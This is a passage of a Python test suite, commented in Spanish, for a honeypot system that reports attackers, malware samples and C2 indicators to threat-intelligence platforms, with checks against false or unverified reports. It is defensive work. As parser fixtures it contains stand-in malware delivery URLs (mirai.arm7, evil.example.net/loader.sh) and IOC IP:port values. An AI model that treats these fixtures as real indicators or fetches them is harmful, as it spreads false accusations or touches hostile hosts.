                        login_successes=1, commands=5, ports={22}, protocols={"ssh"})
    R.check("con handshake y evidencia SI se reporta", ab.report(con_hs))
    R.igual("categorias correctas", ab.categories(con_hs), [15, 18, 22])

    # --- Lo que NO se puede acusar ----------------------------------------
    #
    # Estas cuatro fijan correcciones de acusaciones falsas que se publicaron
    # de verdad. Las definiciones son las literales de abuseipdb.com/categories.
    R.seccion("AbuseIPDB: categorias que no se sostienen")
    R.check("23 IoT Targeted NUNCA: el senuelo es un PC con Debian, no un "
            "aparato IoT, y la categoria exige decir que aparato se ataco",
            23 not in ab.categories(con_hs))

    smb = AttackerIP(ip="45.9.148.100", source="dionaea", first_seen=AHORA,
                     last_seen=AHORA, handshake_ok=True, ports={135, 445, 1433})
    R.check("20 Exploited Host NUNCA por sondear SMB: eso dice que la maquina "
            "de origen esta infectada, y de eso no tenemos ni una prueba",
            20 not in ab.categories(smb))
    R.igual("un sondeo a tres puertos es escaneo de puertos y nada mas",
            ab.categories(smb), [14])

    tel = AttackerIP(ip="45.9.148.101", source="cowrie", first_seen=AHORA,
                     last_seen=AHORA, handshake_ok=True, login_failures=20,
                     ports={23}, protocols={"telnet"})
    R.check("22 SSH NO se marca en una sesion de telnet: es otro protocolo",
            22 not in ab.categories(tel))
    R.check("pero la fuerza bruta si, que su definicion habla de servicios",
            18 in ab.categories(tel))

    R.seccion("AbuseIPDB: el comentario dice la verdad")
    txt = ab.comment(tel)
    R.check("el puerto que se publica es el 23, el que marco el atacante",
            "Target port: 23." in txt)
    R.check("y NO el 2223, que es donde escucha Cowrie por dentro",
            "2223" not in txt and "2222" not in txt)
    R.check("el servicio es el que se ataco de verdad, no una etiqueta fija",
            txt.startswith("Telnet honeypot."))
    R.check("nunca se publica nuestra propia IP en el texto",
            "45.9.148" not in txt)
    uno = AttackerIP(ip="45.9.148.102", source="cowrie", first_seen=AHORA,
                     last_seen=AHORA, handshake_ok=True, login_failures=1,
                     ports={22}, protocols={"ssh"})
    R.check("el plural, bien: '1 failed login attempt' y no 'attempts'",
            "1 failed login attempt." in ab.comment(uno))

    R.seccion("VirusTotal: la etiqueta #iot solo con evidencia")
    from pathlib import Path as _P
    def _m(arch, fams, proto=None, src="cowrie"):
        m = Sample(sha256="b" * 64, path=_P("/dev/null"), size=64, source=src,
                   seen_at=AHORA, protocol=proto)
        type(m).elf_machine = property(lambda self, a=arch: a)
        return m, {"familias": fams, "malicious": 40}

    vtr = VirusTotal(cfg.section("virustotal"), http, estado, guard)
    m, v = _m("mips", ["mirai"])
    R.check("un mirai para MIPS si es IoT", vtr._es_iot(m, v))
    m, v = _m("x86_64", ["xmrig"])
    R.check("un XMRig para x86_64 NO: es mineria en servidores, no IoT",
            not vtr._es_iot(m, v))
    m, v = _m("x86_64", ["kinsing"])
    R.check("un Kinsing para x86_64 tampoco", not vtr._es_iot(m, v))
    m, v = _m("arm", [])
    R.check("una arquitectura de empotrado basta aunque no haya familia",
            vtr._es_iot(m, v))
    m, v = _m("x86_64", ["gafgyt"])
    R.check("y una familia de botnet de IoT basta aunque sea x86",
            vtr._es_iot(m, v))
    m, v = _m("x86_64", ["kinsing"])
    R.check("y entonces el comentario NO lleva la etiqueta",
            "#iot" not in vtr._comment_text(m, v))

    R.seccion("El protocolo que se publica es el que fue")
    m, v = _m("mips", ["mirai"], proto="telnet")
    txt = vtr._comment_text(m, v)
    R.check("por telnet se dice Telnet, no SSH/Telnet",
            "a Telnet honeypot" in txt)
    R.check("y con el articulo bien: 'a Telnet', no 'an Telnet'",
            "an Telnet" not in txt)
    m, v = _m("mips", ["mirai"], proto="ssh")
    R.check("por SSH se dice SSH", "an SSH honeypot" in vtr._comment_text(m, v))
    m, v = _m("mips", ["mirai"])
    R.check("y si el log no lo dijo, se dicen los dos",
            "an SSH/Telnet honeypot" in vtr._comment_text(m, v))

    mbr = MalwareBazaar(cfg.section("malwarebazaar"), http, estado, guard)

    # UNA muestra, UN servicio. Ni "SSH/Telnet" en las de Cowrie ni
    # "SMB/RPC/MSSQL" en las de Dionaea cuando sabemos cual fue.
    esperado = {
        ("ssh", "cowrie"): "an SSH honeypot (Cowrie)",
        ("telnet", "cowrie"): "a Telnet honeypot (Cowrie)",
        ("smb", "dionaea"): "an SMB honeypot (Dionaea)",
        ("mssql", "dionaea"): "an MSSQL honeypot (Dionaea)",
        ("rpc", "dionaea"): "an RPC honeypot (Dionaea)",
    }
    for (proto, src), texto in esperado.items():
        # OJO: no llamar a esta variable "muestra". Hay una funcion con ese
        # nombre en este mismo main(), y asignarla aqui la convierte en local
        # para TODA la funcion: la llamada de mas arriba reventaria con
        # UnboundLocalError. Ya paso.
        ejemplar = _m("mips", [], proto=proto, src=src)[0]
        R.igual(f"{proto} se publica como {texto!r} y nada mas",
                mbr._origen(ejemplar), texto)
        R.check(f"y en VirusTotal igual ({proto})",
                f"Captured by {texto.split(' honeypot')[0]} honeypot"
                in vtr._comment_text(*_m("mips", [], proto=proto, src=src)))

    # Solo cuando el registro NO lo dice se cae en lo generico, que sigue
    # siendo cierto porque el senuelo sirve los dos.
    R.igual("sin dato, Cowrie dice los dos que sirve",
            mbr._origen(_m("mips", [], src="cowrie")[0]),
            "an SSH/Telnet honeypot (Cowrie)")
    R.igual("y Dionaea los tres suyos",
            mbr._origen(_m("mips", [], src="dionaea")[0]),
            "an SMB/RPC/MSSQL honeypot (Dionaea)")

    R.seccion("Dionaea: de que servicio vino cada muestra")
    from common.model import SERVICIO_DE_PUERTO
    R.igual("el 445 es SMB", SERVICIO_DE_PUERTO.get(445), "smb")
    R.igual("el 1433 es MSSQL", SERVICIO_DE_PUERTO.get(1433), "mssql")
    R.igual("el 135 es RPC", SERVICIO_DE_PUERTO.get(135), "rpc")
    R.check("y el collector pide c.local_port, que es de donde sale",
            "c.local_port AS local_port" in
            (Path(__file__).resolve().parent.parent
             / "collectors" / "dionaea.py").read_text())

    R.seccion("Cowrie: el puerto que se guarda es el publico")
    from collectors.cowrie import puerto_publico
    R.igual("2222 es el 22", puerto_publico(2222, None), 22)
    R.igual("2223 es el 23", puerto_publico(2223, None), 23)
    R.igual("lo que no esta en la tabla se deja igual",
            puerto_publico(8080, None), 8080)
    R.igual("y la tabla se puede cambiar desde el config",
            puerto_publico(9999, {9999: 22}), 22)
    R.check("no se repite dentro del enfriamiento", not ab.report(con_hs))

    propia = AttackerIP(ip="203.0.113.7", source="cowrie", first_seen=AHORA,
                        last_seen=AHORA, handshake_ok=True, login_failures=9,
                        ports={22})
    R.check("una IP propia nunca sale, la barrera aborta", not ab.report(propia))

    # El tope tiene que contar ENVIOS, no candidatas. Cuando se recortaba la
    # lista antes de mirarla, las primeras del orden --- que suelen ser las que
    # caen por la ventana de enfriamiento --- se llevaban el cupo entero y se
    # reportaban CERO. Y como el orden es estable, se repetia cada pasada.
    ab2 = AbuseIPDB(cfg.section("abuseipdb"), http, estado, guard)
    ab2.max_per_run = 2
    lote = [propia] * 3 + [
        AttackerIP(ip=f"185.7.8.{i}", source="cowrie", first_seen=AHORA,
                   last_seen=AHORA, handshake_ok=True, login_failures=8,
                   ports={22}, protocols={"ssh"})
        for i in range(5)]
    R.igual("tres candidatas invalidas no consumen el cupo", ab2.run(lote), 2)
    R.igual("y el resto queda anotado como aplazado", ab2.aplazados, 3)

    # ------------------------------------------------------- URLhaus/ThreatFox
    R.seccion("URLhaus y ThreatFox")
    R.check("sin binario capturado no se envia la URL",
            not uh.submit(PayloadURL(url="http://185.7.7.7/x.sh", source="cowrie",
                                     seen_at=AHORA)))
    R.check("con binario capturado si",
            uh.submit(PayloadURL(url="http://185.7.7.7/arm7", source="cowrie",
                                 seen_at=AHORA, sha256=s.sha256)))
    R.check("los acortadores se descartan",
            not uh.submit(PayloadURL(url="http://bit.ly/abc", source="cowrie",
                                     seen_at=AHORA, sha256=s.sha256)))
    R.check("una URL vieja se descarta",
            not uh.submit(PayloadURL(url="http://185.7.7.7/viejo", source="cowrie",
                                     seen_at=AHORA - timedelta(days=9),
                                     sha256=s.sha256)))

    ioc = C2Indicator(ioc="185.7.7.7:80", ioc_type="ip:port", source="cowrie",
                      seen_at=AHORA, malware="mirai")
    R.check("un IOC sin vetar no sale", not tf.submit(ioc, vetted=False))
    R.check("una familia sin nombre de Malpedia no sale",
            not tf.submit(C2Indicator(ioc="1.2.3.4:80", ioc_type="ip:port",
                                      source="cowrie", seen_at=AHORA,
                                      malware="inventada"), vetted=True))
    R.check("un IOC vetado y con familia conocida si sale", tf.submit(ioc, vetted=True))

    # ---- Que quedo publicado de verdad ------------------------------------
    #
    # submit_ioc responde query_status=ok tanto si ThreatFox crea el indicador
    # como si lo funde con uno que ya tenia de otra persona. El 2026-08-28 el
    # parte dijo "threatfox: 1 publicadas", el perfil siguio con 9
    # contribuciones, y las dos cosas eran ciertas. Estas comprobaciones son
    # sobre la lectura de search_ioc, que es lo que distingue una de otra.
    def busqueda(estado, datos=None, status=200):
        cuerpo = {"query_status": estado}
        if datos is not None:
            cuerpo["data"] = datos
        return http_mod.Response(status=status, text=json.dumps(cuerpo),
                                 json_body=cuerpo)

    R.igual("si el reporter somos nosotros, el IOC es nuevo",
            tf._leer_busqueda(busqueda("ok", [{"ioc": "185.7.7.7:80",
                                               "reporter": "NuestroUsuario",
                                               "id": 42}]), "185.7.7.7:80"),
            "nuevo, id=42")
    R.igual("si el reporter es otro, lo nuestro fue un refresco",
            tf._leer_busqueda(busqueda("ok", [{"ioc": "185.7.7.7:80",
                                               "reporter": "nullblue67",
                                               "id": 1869525}]), "185.7.7.7:80"),
            "refresco de nullblue67, id=1869525")
    # El nombre no distingue mayusculas: darlo por ajeno por como se escribio
    # en el config contaria como refresco algo que es nuestro.
    R.igual("el nombre se compara sin distinguir mayusculas",
            tf._leer_busqueda(busqueda("ok", [{"ioc": "1.2.3.4:80",
                                               "reporter": "nuestrousuario",
                                               "id": 7}]), "1.2.3.4:80"),
            "nuevo, id=7")
    # La busqueda puede devolver varias entradas; hay que quedarse con la que
    # coincide, no con la primera que venga.
    R.igual("con varios resultados se elige el que coincide",
            tf._leer_busqueda(busqueda("ok", [
                {"ioc": "otra:80", "reporter": "alguien", "id": 1},
                {"ioc": "185.7.7.7:80", "reporter": "NuestroUsuario", "id": 2},
            ]), "185.7.7.7:80"),
            "nuevo, id=2")
    R.check("si no aparece en la busqueda, se dice",
            "no aparece" in tf._leer_busqueda(busqueda("no_result"), "1.2.3.4:80"))
    R.check("un error de la consulta no se disfraza de dato",
            tf._leer_busqueda(busqueda("ok", status=503), "x").startswith("sin-verificar"))
    R.check("una respuesta sin data tampoco",
            tf._leer_busqueda(busqueda("ok"), "x").startswith("sin-verificar"))

    # NO PUEDE TUMBAR LA PASADA. Lo que se verifica es algo ya publicado: si
    # la comprobacion falla, el envio sigue siendo valido y solo se pierde la
    # anotacion. Por eso _verificar se traga cualquier excepcion.
    estado.commit_send("threatfox", "ip:port:9.9.9.9:80", "enviado", "elf.mirai")
    class HttpRoto:
        def request(self, *a, **kw):
            raise RuntimeError("la red no va")
    tf_roto = ThreatFox(cfg.section("threatfox"), HttpRoto(), estado, guard)
    tf_roto._verificar("ip:port:9.9.9.9:80", "9.9.9.9:80", "elf.mirai")
    fila = estado.db.execute(
        "SELECT detail FROM sent WHERE platform='threatfox' AND key=?",
        ("ip:port:9.9.9.9:80",)).fetchone()
    R.check("si la consulta revienta, el envio se queda anotado igual",
            fila is not None and "sin-verificar" in fila[0])

    # Sin usuario en el config no se adivina: se dice que no se comprobo.
    seccion_sin_usuario = cfg.section("threatfox")
    seccion_sin_usuario["usuario"] = "<TU-USUARIO-EN-THREATFOX>"
    R.igual("un marcador sin sustituir cuenta como usuario no puesto",
            ThreatFox(seccion_sin_usuario, http, estado, guard).usuario, "")

    # ---- De donde sale el IOC: el puerto se OBSERVA, no se supone ----------
    #
    # Esto es lo que casi nos cuesta la cuenta de abuse.ch. El puerto que no
    # venia en la URL se rellenaba con "443 si https, si no 80", y para un
    # esquema que no sea http/https eso es inventarselo. El caso real del
    # 2026-08-20: Dionaea nombra una subida por SMB con la pseudo-URL
    # smb://IP/transaction/\PIPE\, y de ahi salia "IP:80" --- un puerto al que
    # no se conecto nadie --- publicado como infraestructura de entrega en una
    # plataforma cuya unica regla es "solo IOC confirmados".
    from orchestrator import _ioc_de                            # noqa: E402

    R.igual("una pseudo-URL de SMB no produce ningun IOC",
            _ioc_de(r"smb://46.46.121.73/transaction/\PIPE\ ".strip())[0], None)
    R.igual("ni tftp, que tampoco dice el puerto que se uso",
            _ioc_de("tftp://10.0.0.5/mips")[0], None)
    R.check("y el descarte explica por que, para que se vea en el resumen",
            "sin verificar" in _ioc_de("tftp://10.0.0.5/mips")[2])

    R.igual("un puerto explicito se respeta",
            _ioc_de("http://185.7.214.4:39999/bins/mirai.arm7")[:2],
            ("185.7.214.4:39999", "ip:port"))
    R.igual("http sin puerto es 80 de verdad, no una suposicion",
            _ioc_de("http://45.128.232.10/x86")[:2], ("45.128.232.10:80", "ip:port"))
    R.igual("https sin puerto es 443",
            _ioc_de("https://45.128.232.10/x86")[:2], ("45.128.232.10:443", "ip:port"))
    R.igual("un nombre de dominio sale como domain, sin puerto",
            _ioc_de("https://evil.example.net/loader.sh")[:2],
            ("evil.example.net", "domain"))

    # La familia es la puerta que mas IOC tira: VirusTotal identifica muchas
    # mas de las que ThreatFox sabe traducir a Malpedia. No es un fallo --- no
    # se inventa un nombre --- pero conviene que el desfase sea visible aqui y
    # no una sorpresa dentro de seis meses.
    from reporters.threatfox import MALPEDIA                    # noqa: E402
    # Ya viene importado arriba: repetirlo aqui dentro convertia el nombre en
    # local para toda la funcion, y los usos de mas arriba reventaban.
    sin_mapa = KNOWN_FAMILIES - set(MALPEDIA)
    R.check(f"desfase conocido: VT identifica {len(KNOWN_FAMILIES)} familias y "
            f"ThreatFox traduce {len(MALPEDIA)} ({len(sin_mapa)} no dan IOC)",
            len(sin_mapa) > 0)
    R.check("todo nombre de Malpedia lleva su prefijo de plataforma",
            all("." in v for v in MALPEDIA.values()))

    R.seccion("Tope duro: la ultima red por si fallara todo lo demas")
    mb.max_per_day = 1
    R.check("alcanzado el tope diario, no se sube nada mas",
            not mb.caps_ok("f" * 64))
    mb.max_per_day, mb.max_per_week = 5, 0
    R.check("el tope semanal tambien corta", not mb.caps_ok("e" * 64))

    # ------------------------------------------- el resumen dice QUIEN
    #
    # Antes daba un solo numero para veinte motivos distintos. Un
    # "abuseipdb: 3 enviados, 283 rechazados" alarma, y resulta que eran 280
    # IP ya cubiertas por la ventana de 24 h --- el sistema funcionando.
    R.seccion("El resumen distingue quien no lo envio")

    class _Resumen(AbuseIPDB):
        def __init__(self):
            self.name, self.sent, self.rejected, self.motivos = "prueba", 3, 0, {}

    r = _Resumen()
    r.motivos = {"enfriamiento": 280, "handshake": 2, "evidencia": 1}
    R.igual("lo ya cubierto no se llama rechazo",
            r.summary(), "prueba: 3 enviados, 280 ya cubiertas, 3 descartadas")

    r2 = _Resumen()
    r2.sent, r2.motivos = 0, {"tope-por-pasada": 5}
    R.igual("lo aplazado se distingue de lo descartado",
            r2.summary(), "prueba: 0 enviados, 5 aplazadas")

    r3 = _Resumen()
    r3.sent, r3.motivos = 0, {"rechazo-plataforma": 1}
    R.check("un rechazo AJENO se grita, que es el unico que pide accion",
            "RECHAZADAS POR LA PLATAFORMA" in r3.summary(), r3.summary())

    r4 = _Resumen()
    r4.sent, r4.motivos = 7, {}
    R.igual("sin motivos, la linea no se llena de ceros",
            r4.summary(), "prueba: 7 enviados")

    R.seccion("Motivos de rechazo consultables")
    motivos = {r["gate"] for r in estado.recent_rejections(200)}
    for esperado in ("antiguedad", "capa1-local", "capa4-campana", "handshake",
                     "barrera", "acortador", "familia", "tope-diario"):
        R.check(f"queda registro del rechazo por {esperado}", esperado in motivos)

    R.seccion("Forma exacta de lo que se envia")
    # Estas comprobaciones existen porque el doble de requests acepta
    # cualquier cosa: sin ellas, un payload con los campos mal nombrados pasa
    # todas las pruebas y solo falla contra la plataforma de verdad.
    envio_mb = next((c for c in http.simulated_calls if "mb-api" in c["url"]), None)
    R.check("MalwareBazaar envia json_data junto al fichero, no campos sueltos",
            envio_mb is not None and envio_mb["files"] == ["file", "json_data"],
            str(envio_mb))

    # Y lo que va DENTRO del json_data, que es lo que de verdad acepta o
    # rechaza la plataforma. Los campos se comparan contra el payload del
    # script anterior, el que subio las muestras que hoy estan publicadas:
    # es lo unico que sabemos que MalwareBazaar acepto.
    cuerpo_mb = (envio_mb or {}).get("multipart", {}).get("json_data", "")
    for campo in ("identifier", "anonymous", "delivery_method", "tags"):
        R.check(f"el json_data lleva {campo}", f'"{campo}"' in cuerpo_mb, cuerpo_mb)
    R.check("y no se sube como anonimo", '"anonymous": 0' in cuerpo_mb, cuerpo_mb)

    envio_uh = next((c for c in http.simulated_calls if "urlhaus" in c["url"]), None)
    R.check("URLhaus manda la Auth-Key en cabecera",
            envio_uh is not None and "Auth-Key" in envio_uh["headers"],
            str(envio_uh))
    R.check("URLhaus usa los campos en minuscula del script de referencia",
            envio_uh is not None and "'url'" in (envio_uh["json"] or "")
            and "'threat'" in (envio_uh["json"] or ""),
            str(envio_uh and envio_uh["json"]))
    R.check("URLhaus ya no manda la clave dentro del cuerpo",
            envio_uh is not None and "token" not in (envio_uh["json"] or ""))

    R.seccion("Un rechazo de abuse.ch no se da por publicado")
    # Responden HTTP 200 con el error dentro del JSON. Mirando solo el codigo
    # HTTP, un rechazo quedaria marcado como enviado para siempre.
    from common.http import Response
    # "success" es el que devuelve add_comment. Sin el en la lista, un
    # comentario ACEPTADO se registraba como rechazo de plataforma, y esos son
    # los que alimentan el cortacircuitos: tres subidas correctas seguidas
    # habrian apagado las tres cuentas de abuse.ch por un fallo nuestro.
    for qs, esperado in (("ok", True), ("inserted", True),
                         ("file_already_known", True), ("success", True),
                         ("illegal_hash", False), ("no_results", False)):
        resp = Response(status=200, text="{}", json_body={"query_status": qs})
        R.igual(f"query_status={qs}", mb.response_ok(resp)[0], esperado)
    R.igual("una respuesta sin query_status tampoco cuela",
            mb.response_ok(Response(status=200, text="vacio", json_body={}))[0], False)

    R.seccion("Deteccion del fallo silencioso de IP enmascaradas")
    # Si Docker enmascara el origen, todo llega como la puerta de enlace del
    # bridge, la barrera lo descarta con razon y el reporter dice "0 atacantes"
    # indefinidamente sin un solo error. Tiene que avisar.
    import logging

    from collectors import cowrie as col_cowrie

    avisos: list[str] = []

    class Captura(logging.Handler):
        def emit(self, record):
            if record.levelno >= logging.WARNING:
                avisos.append(record.getMessage())

    registro = logging.getLogger("dirtyland.collector.cowrie")
    registro.addHandler(Captura())
    # Esta bateria silencia el log a ERROR; sin bajar el nivel aqui, el aviso
    # se filtraria antes de llegar al captador y la prueba mediria el silencio
    # en vez del aviso.
    registro.setLevel(logging.WARNING)
    ld = d / "logs-falsos"; ld.mkdir()
    vacio = d / "sin-descargas"; vacio.mkdir()

    def escribir(ips: list[str]) -> None:
        (ld / "cowrie.json").write_text("\n".join(json.dumps({
            "eventid": "cowrie.session.connect", "src_ip": ip, "dst_port": 22,
            "timestamp": AHORA.isoformat()}) for ip in ips), encoding="utf-8")

    escribir(["172.20.0.1"] * 122)
    avisos.clear()
    col_cowrie.collect(ld, "cowrie.json*", vacio, guard, lookback_hours=99999)
    R.check("avisa cuando todo llega desde la puerta de enlace de Docker",
            any("enmascarando" in a for a in avisos), str(avisos))

    escribir([f"45.9.148.{i % 200 + 1}" for i in range(122)])
    avisos.clear()
    atacantes, _, _ = col_cowrie.collect(ld, "cowrie.json*", vacio, guard,
                                         lookback_hours=99999)
    R.check("no avisa cuando el trafico es legitimo", not avisos, str(avisos))
    R.igual("y los recoge todos", len(atacantes), 122)

    R.seccion("Cortacircuitos de la cuenta compartida de abuse.ch")
    # MalwareBazaar, ThreatFox y URLhaus cuelgan de la misma cuenta: una
    # sancion en cualquiera se lleva las tres. Por eso unos pocos rechazos, da
    # igual de cual vengan, tienen que apagar las tres a la vez.
    R.check("antes de nada, las tres estan activas",
            mb.is_enabled() and tf.is_enabled() and uh.is_enabled())

    for i in range(mb.MAX_RECHAZOS):
        plataforma = (mb, tf, uh)[i % 3]
        estado.reject(plataforma.name, f"cosa{i}", "rechazo-plataforma",
                      "query_status=illegal_hash")
    tf.on_rejected("cosa-final", "query_status=illegal_hash")

    R.check("el cortacircuitos salta", estado.breaker("abuse.ch") is not None)
    R.check("MalwareBazaar queda apagada", not mb.is_enabled())
    R.check("ThreatFox queda apagada", not tf.is_enabled())
    R.check("URLhaus queda apagada", not uh.is_enabled())
    R.check("y ya no sube nada aunque la muestra fuera perfecta",
            not mb.upload(muestra(elf_arm + b"BRK", d / "brk", host="7.7.7.7"),
                          dict(v, vhash="vh-brk"), "mirai"))

    R.seccion("Pero la cuenta de abuse.ch no arrastra a las demas")
    R.check("VirusTotal sigue activa", vt.is_enabled())
    R.check("AbuseIPDB sigue activa", ab.is_enabled())

    R.seccion("Solo se rearma a mano")
    R.check("rearmar lo reactiva", estado.clear_breaker("abuse.ch"))
    R.check("y las tres vuelven",
            mb.is_enabled() and tf.is_enabled() and uh.is_enabled())

    R.seccion("Sin cuota de VirusTotal no se publica nada, se acumula")
    # Toda la cadena depende del veredicto de VirusTotal. Si se agota su cuota
    # diaria, lo correcto es que las muestras se queden esperando, no que se
    # publiquen a ciegas ni que sigamos preguntando y acumulando 429.
    R.igual("las consultas tambien cuentan para la cuota",
            estado.calls_today("virustotal") > 0, True)

    limite = ratelimit.LIMITS["virustotal"][1]
    for _ in range(limite):
        estado.note_call("virustotal")

    llamadas_antes = len(LLAMADAS)
    try:
        vt.verdict(s.sha256)
        R.check("agotada la cuota, la consulta se bloquea", False, "no se bloqueo")
    except LookupError:
        R.check("agotada la cuota, la consulta se bloquea", True)

    s_sin = muestra(elf_arm + b"NOQ", d / "noquota", host="4.4.4.4")
    R.check("y MalwareBazaar no sube nada sin veredicto",
            not mb.upload(s_sin, {"first_submission": None}, "mirai"))
    R.igual("sin gastar ni una peticion mas", len(LLAMADAS) - llamadas_antes, 0)
    R.check("la muestra sigue en la cola, no descartada",
            estado.get_sample(s.sha256) is None
            or estado.get_sample(s.sha256)["state"] != DISCARDED)

    # ------------------------------------------------- goteo por pasada
    #
    # Las puertas deciden QUE se puede publicar; este tope decide CUANTO de
    # una vez. Si una noche caen cincuenta binarios validos, subirlos todos
    # de golpe es indistinguible de un volcado automatico. Lo que no sale hoy
    # sale en la pasada siguiente: no se pierde nada.
    R.seccion("Tope por pasada: se gotea, no se vuelca")

    from common.http import Response as _Resp
    from reporters.base import Reporter as _Rep

    class _Goteo(_Rep):
        name = "prueba-goteo"
        MAX_PER_RUN = 3

    gote = _Goteo(cfg.section("virustotal"), http, estado, guard, dry_run=True)
    gote.max_per_run = 3
    aceptados = sum(
        1 for i in range(10)
        if gote.send(f"clave-{i}", lambda: _Resp(200, "{}", {}, {}, True)) is not None)

    R.igual("solo salen los primeros del tope", aceptados, 3)
    R.igual("el resto queda rechazado, no perdido", gote.rejected, 7)
    R.check("y el motivo dice que se reintenta",
            any(r["gate"] == "tope-por-pasada"
                for r in estado.recent_rejections(50)))

    # Lo que se aplaza tiene que poder distinguirse de lo que se rechaza. Sin
    # esta senal, quien orquesta marcaba la muestra como PUBLISHED aunque no
    # se hubiera subido, y salia de la cola para siempre.
    R.check("un tope deja marcado que hay algo aplazado", gote.diferido)

    limpio = _Goteo(cfg.section("virustotal"), http, estado, guard, dry_run=True)
    R.check("un reporter recien creado no arrastra el aplazamiento",
            not limpio.diferido)
    limpio.gate("x", "familia", False, "motivo cualquiera")
    R.check("y un rechazo de fondo NO cuenta como aplazado",
            not limpio.diferido)

    R.igual("AbuseIPDB va mas alto: su politica cuenta con volumen",
            AbuseIPDB.MAX_PER_RUN, 25)
    R.check("ThreatFox y URLhaus van al minimo",
            ThreatFox.MAX_PER_RUN == URLhaus.MAX_PER_RUN == 3)
    # Seis envios = TRES muestras: cada una gasta su subida y su comentario.
    R.igual("y MalwareBazaar va al doble por el comentario",
            MalwareBazaar.MAX_PER_RUN, 6)
    # El config manda sobre la clase, y el ejemplo traia un 3: la segunda
    # subida de cada pasada se quedaba sin comentario para siempre, porque
    # add_comment solo se intenta justo despues de subir.
    import configparser as _cp2
    _ej2 = _cp2.ConfigParser(inline_comment_prefixes=(";",))
    _ej2.read(Path(__file__).resolve().parent.parent / "config.ini.example")
    _tope_mb = _ej2.getint("malwarebazaar", "max_per_run")
    R.check("el config.ini.example no pisa ese doble con un impar",
            _tope_mb >= 6 and _tope_mb % 2 == 0)

    # --------------------------------------------- la hora de los eventos
    #
    # Cowrie firma con "Z" pero escribe hora local. Con el senuelo en Kyiv,
    # una denuncia salia fechada tres horas en el futuro y nada lo delataba:
    # la cadena es ISO valida y se interpreta sin error.
    # Un binario de Dionaea tiene que quedar atado a su fila de descarga
    # aunque el fichero se llame de una forma y la fila se indexe de otra.
    #
    # Este fallo estuvo activo toda la vida del sistema: el codigo buscaba
    # url_by_md5.get(path.name) con nombres de 64 caracteres (SHA-256) en un
    # indice de claves de 32 (MD5). No fallaba a veces --- no podia acertar
    # nunca. Y se llevaba por delante la URL, la IP de origen y con ella la
    # campana, asi que ThreatFox y URLhaus no llegaron a recibir ni una sola
    # peticion, y las 34 muestras de WannaCry entraban todas como la misma
    # campana ficticia.
    R.seccion("Un binario de Dionaea se ata a su descarga con cualquier hash")

    import hashlib as _hl
    from collectors.dionaea import _collect_binaries as _cb
    from common.model import campaign_host as _campana

    _dir = Path(tempfile.mkdtemp())
    _datos = b"MZ\x90\x00 binario de prueba"
    _md5 = _hl.md5(_datos).hexdigest()
    _sha = _hl.sha256(_datos).hexdigest()
    _info = {"url": "http://185.7.214.4:39999/bins/x86",
             "src_ip": "185.7.214.4", "ts": AHORA}

    # Como los guarda esta version de Dionaea: por SHA-256.
    (_dir / _sha).write_bytes(_datos)
    _m = _cb(_dir, {_md5: _info}, {})[0]
    R.igual("nombre SHA-256 contra indice MD5: encuentra la URL",
            _m.download_url, "http://185.7.214.4:39999/bins/x86")
    R.igual("y la IP de origen", _m.src_ip, "185.7.214.4")
    R.igual("con lo que la campana deja de ser 'desconocida'",
            _campana(_m), "185.7.214.4")

    # Y al reves, por si otra version vuelve a nombrarlos por MD5.
    _dir2 = Path(tempfile.mkdtemp())
    (_dir2 / _md5).write_bytes(_datos)
    R.igual("nombre MD5 contra indice MD5: tambien",
            _cb(_dir2, {_md5: _info}, {})[0].src_ip, "185.7.214.4")

    # Y si la fila se indexa por el sha de la tabla, igual.
    _dir3 = Path(tempfile.mkdtemp())
    (_dir3 / _sha).write_bytes(_datos)
    R.igual("indice por SHA-256: tambien",
            _cb(_dir3, {_sha: _info}, {})[0].src_ip, "185.7.214.4")

    # Sin fila de descarga no se inventa nada: eso sigue siendo desconocido.
    _dir4 = Path(tempfile.mkdtemp())
    (_dir4 / _sha).write_bytes(_datos)
    _m4 = _cb(_dir4, {}, {})[0]
    R.igual("sin fila de descarga, la campana sigue siendo desconocida",
            _campana(_m4), SIN_CAMPANA)
    R.igual("y no se inventa una URL", _m4.download_url, None)

    # El enlace, contra la forma REAL de los datos de la maquina: filas de
    # descarga SIN URL (una subida por SMB no se baja de ningun sitio) y con
    # fecha de hace dias (los binarios se quedan en disco y se reevaluan).
    # Con esas dos cosas, el enlace ataba 3 de 46. Cada mitad se rompia por su
    # lado: la consulta tiraba las filas sin URL, y la ventana de 24 h tiraba
    # las viejas.
    R.seccion("El origen se recupera aunque no haya URL ni sea de hoy")

    import sqlite3 as _sq
    from collectors.dionaea import DionaeaSource as _DS, collect as _collect

    _tmp = Path(tempfile.mkdtemp())
    _db = _tmp / "dionaea.sqlite"
    _con = _sq.connect(_db)
    _con.executescript("""
        CREATE TABLE connections (connection INTEGER PRIMARY KEY,
                                  remote_host TEXT, remote_port INTEGER,
                                  local_host TEXT, local_port INTEGER,
                                  connection_protocol TEXT,
                                  connection_type TEXT,
                                  connection_timestamp INTEGER);
        CREATE TABLE downloads (download INTEGER PRIMARY KEY, connection INTEGER,
                                download_url TEXT, download_md5_hash TEXT);
    """)
    _viejo = int((AHORA - timedelta(days=6)).timestamp())
    _con.execute("INSERT INTO connections VALUES (1,'185.7.214.4',4444,"
                 "'10.0.0.1',445,'smbd','accept',?)", (_viejo,))
    _datos = b"MZ\x90\x00 subida por SMB, sin URL"
    _md5d = _hl.md5(_datos).hexdigest()
    _shad = _hl.sha256(_datos).hexdigest()
    # Sin URL y de hace seis dias: las dos condiciones que la tiraban.
    _con.execute("INSERT INTO downloads VALUES (1,1,'',?)", (_md5d,))
    _con.commit(); _con.close()

    _bins = Path(tempfile.mkdtemp())
    (_bins / _shad).write_bytes(_datos)

    _a, _s, _u = _collect(_db, _bins, guard, lookback_hours=24)
    R.igual("el binario se recoge", len(_s), 1)
    R.igual("y recupera la IP de origen pese a no tener URL",
            _s[0].src_ip if _s else None, "185.7.214.4")
    R.igual("con lo que la campana deja de ser desconocida",
            _campana(_s[0]) if _s else None, "185.7.214.4")
    R.igual("no se inventa una URL de descarga", _s[0].download_url if _s else "x", None)
    # Y la ventana sigue viva donde toca: una URL de hace seis dias no va a
    # URLhaus, cuya politica pide no enviar enlaces probablemente caidos.
    R.igual("una URL vieja NO entra en la lista de URLhaus", len(_u), 0)

    R.igual("downloads() sin ventana devuelve la fila sin URL",
            len(_DS(_db).downloads()), 1)
    R.igual("y con ventana de 24 h la de hace seis dias se queda fuera",
            len(_DS(_db).downloads(int((AHORA - timedelta(hours=24)).timestamp()))), 0)

    R.seccion("Las marcas de Cowrie se leen en su huso")

    from datetime import timedelta as _td, timezone as _tz
    from collectors.cowrie import parse_timestamp, resolver_huso
